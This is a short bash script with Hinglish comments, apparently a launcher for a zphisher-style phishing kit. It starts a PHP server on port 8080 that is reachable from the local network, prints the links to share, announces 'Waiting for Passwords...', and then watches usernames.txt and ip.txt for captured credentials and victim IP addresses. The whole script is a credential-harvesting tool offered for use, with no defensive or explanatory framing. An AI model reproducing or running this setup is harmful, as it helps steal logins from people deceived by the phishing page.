#!/bin/bash

# --- 1. SETUP ---
# Folder banana
mkdir -p "$HOME/.zphisher_tmp"
chmod 777 "$HOME/.zphisher_tmp" 2>/dev/null

# --- 2. CLEANUP (Fix for Line 13) ---
# Yahan '|| true' lagaya hai taaki agar koi error aaye to bhi script ruke nahi
pkill -f php > /dev/null 2>&1 || true
rm -rf php_error.log 2>/dev/null

# --- 3. COLORS ---
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
CYAN=$(tput setaf 6)
RESET=$(tput sgr0)

clear
echo "${RED}========================================${RESET}"
echo "${RED}       ANURAG HKR (Auto-Server)        ${RESET}"
echo "${RED}========================================${RESET}"
echo ""
echo "${CYAN}[*] Starting PHP Server...${RESET}"

# --- 4. START SERVER (Port 8080 - Safer Port) ---
# Humne port 8888 se 8080 kar diya hai (kabhi kabhi 8888 busy hota hai)
php -S 0.0.0.0:8080 -t . > php_error.log 2>&1 &
PID=$!
sleep 2

# --- 5. FINAL CHECK ---
if ps -p $PID > /dev/null; then
   echo "${GREEN}[✔] SERVER IS RUNNING!${RESET}"
   echo ""
   echo "${CYAN}Link 1: http://localhost:8080${RESET}"
   
   # IP nikalne ka simple tareeka
   MYIP=$(ifconfig | grep -oE "192\.168\.[0-9]+\.[0-9]+" | head -n 1)
   if [ -z "$MYIP" ]; then
       MYIP=$(ifconfig | grep -oE "10\.[0-9]+\.[0-9]+\.[0-9]+" | head -n 1)
   fi

   if [ ! -z "$MYIP" ]; then
      echo "${CYAN}Link 2: http://$MYIP:8080${RESET}"
   fi
   
   echo ""
   echo "${RED}[!] Press Ctrl + C to Stop${RESET}"
   echo "${GREEN}Waiting for Passwords...${RESET}"
   
   # Log check loop
   tail -f usernames.txt ip.txt 2>/dev/null

else
   echo "${RED}[!] ERROR: Server start nahi hua!${RESET}"
   echo "${YELLOW}Checking php_error.log...${RESET}"
   cat php_error.log
fi
